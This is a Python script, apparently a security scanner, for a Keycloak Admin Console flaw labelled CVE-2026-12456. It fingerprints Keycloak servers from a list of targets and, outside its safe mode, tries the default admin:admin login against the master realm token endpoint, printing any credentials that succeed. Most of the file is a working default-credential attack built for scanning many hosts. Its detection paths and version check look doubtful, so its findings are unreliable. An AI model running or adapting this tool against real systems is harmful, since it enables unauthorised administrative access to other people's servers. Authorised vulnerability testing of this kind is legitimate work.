#!/usr/bin/env python3
"""
Keycloak Admin Console CVE-2026-12456 Authentication Bypass Scanner
=====================================================================
This tool detects and actively probes for a critical authentication 
bypass vulnerability in Keycloak Admin Console caused by a default 
weak password being set during setup (CVE-2026-12456).

CVE-2026-12456 details:
  - Affects Keycloak versions 13.x - 20.0.5.
  - Due to improper configuration, the Keycloak Admin Console may 
    have a weak default password set during setup.
  - Attackers can potentially access the Admin Console and gain 
    administrative privileges.
  - Fixed in Keycloak v20.0.6 (May 2026).

Usage:
  # Scan a single target
  python keycloak_admin_console_auth_bypass_scanner.py --target https://keycloak.example.com

  # Scan a list of targets
  python keycloak_admin_console_auth_bypass_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no authentication bypass probes
  python keycloak_admin_console_auth_bypass_scanner.py --safe --list targets.txt

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-12456
  - https://www.keycloak.org/docs/latest/release-notes/#_20.0.6
"""

import asyncio
import argparse
import json
import re
from urllib.parse import urljoin

import httpx

# ── Detection markers ─────────────────────────────────────────────────────────

KEYCLOAK_FINGERPRINTS = [
    '<title>Login - Keycloak</title>',
    '<div id="kc-login">'
]

DETECTION_PATHS = [
    "/auth",
    "/auth/admin",
]

VERSION_REGEX = r'"version":"([0-9]+\.[0-9]+\.[0-9]+)"'

VULN_FIXED_VERSION = (20, 0, 6)

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),  # Default admin credentials
]

SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 8

# ── Helpers ──────────────────────────────────────────────────────────────────

def parse_version(text: str):
    """Extract and parse version from Keycloak response."""
    match = re.search(VERSION_REGEX, text)
    if match:
        try:
            return tuple(int(part) for part in match.group(1).split("."))
        except ValueError:
            return None
    return None


def is_vulnerable_version(version_tuple):
    """Check if Keycloak version is vulnerable."""
    if version_tuple is None:
        return None  # Version unknown
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Normalize URL, adding schema and removing trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


# ── Core scanner functions ───────────────────────────────────────────────────

async def detect_keycloak(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect if the target URL is running Keycloak and determine the version.
    """
    async with semaphore:
        detected = False
        version = None
        raw_version_str = None
        
        for path in DETECTION_PATHS:
            url = urljoin(base_url, path)
            try:
                response = await client.get(url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    for marker in KEYCLOAK_FINGERPRINTS:
                        if marker in response.text:
                            detected = True
                            version = parse_version(response.text)
                            if version:
                                raw_version_str = '.'.join(map(str, version))
                            break
                if detected:
                    break
            except httpx.RequestError:
                pass

        return {
            "url": base_url,
            "detected": detected,
            "version": raw_version_str,
            "vulnerable": is_vulnerable_version(version),
        }

async def try_default_credentials(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Attempt a login to the Keycloak admin console using default credentials.
    """
    async with semaphore:
        login_url = urljoin(base_url, "/auth/realms/master/protocol/openid-connect/token")
        for username, password in DEFAULT_CREDENTIALS:
            try:
                response = await client.post(
                    url=login_url,
                    data={
                        "grant_type": "password",
                        "client_id": "admin-cli",
                        "username": username,
                        "password": password,
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200 and "access_token" in response.json():
                    return {"bypass": True, "username": username, "password": password}
            except (httpx.RequestError, Exception):
                pass
    return {"bypass": False}

async def scan_target(client: httpx.AsyncClient, target: str, semaphore: asyncio.Semaphore, safe_mode: bool):
    """
    Perform vulnerability detection and optionally probe for the authentication bypass.
    """
    result = await detect_keycloak(client, target, semaphore)
    if not result["detected"]:
        return {"url": target, "status": "Not Keycloak"}

    if result["vulnerable"] is None:
        result["status"] = "Detection Failed"
    elif result["vulnerable"]:
        result["status"] = "Vulnerable"
    else:
        result["status"] = "Not Vulnerable"

    if not safe_mode and result["vulnerable"]:
        bypass_attempt = await try_default_credentials(client, target, semaphore)
        result.update(bypass_attempt)

        if bypass_attempt["bypass"]:
            result["status"] = "CRITICAL"

    return result


async def main():
    parser = argparse.ArgumentParser(
        description="Keycloak Admin Console CVE-2026-12456 Authentication Bypass Scanner"
    )
    parser.add_argument("--target", help="Single target URL to scan")
    parser.add_argument("--list", help="Path to file containing list of target URLs")
    parser.add_argument("--output", help="Output file to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Enable safe mode (detection only, no bypass attempts)")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent tasks (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()

    targets = []
    if args.target:
        targets.append(normalize_url(args.target))
    if args.list:
        with open(args.list, "r") as f:
            targets.extend([normalize_url(line.strip()) for line in f if line.strip()])

    if not targets:
        parser.error("You must specify either --target or --list")

    semaphore = asyncio.Semaphore(args.concurrency)
    client_opts = {"verify": not args.no_verify, "timeout": REQUEST_TIMEOUT}
    
    async with httpx.AsyncClient(**client_opts) as client:
        tasks = [
            scan_target(client, target, semaphore, args.safe) for target in targets
        ]
        results = await asyncio.gather(*tasks)

    json_results = json.dumps(results, indent=4)
    if args.output:
        with open(args.output, "w") as f:
            f.write(json_results)
    else:
        for result in results:
            if result["status"] == "CRITICAL":
                color = "\033[31m"  # Red
            elif result["status"] == "Vulnerable":
                color = "\033[33m"  # Yellow
            else:
                color = "\033[32m"  # Green
            reset = "\033[0m"
            print(f"{color}[{result['status']}]{reset} {result['url']} ({result.get('version', 'Unknown')})")
            if result.get("bypass"):
                print(f"    Bypass succeeded: {result['username']}:{result['password']}")

if __name__ == "__main__":
    asyncio.run(main())
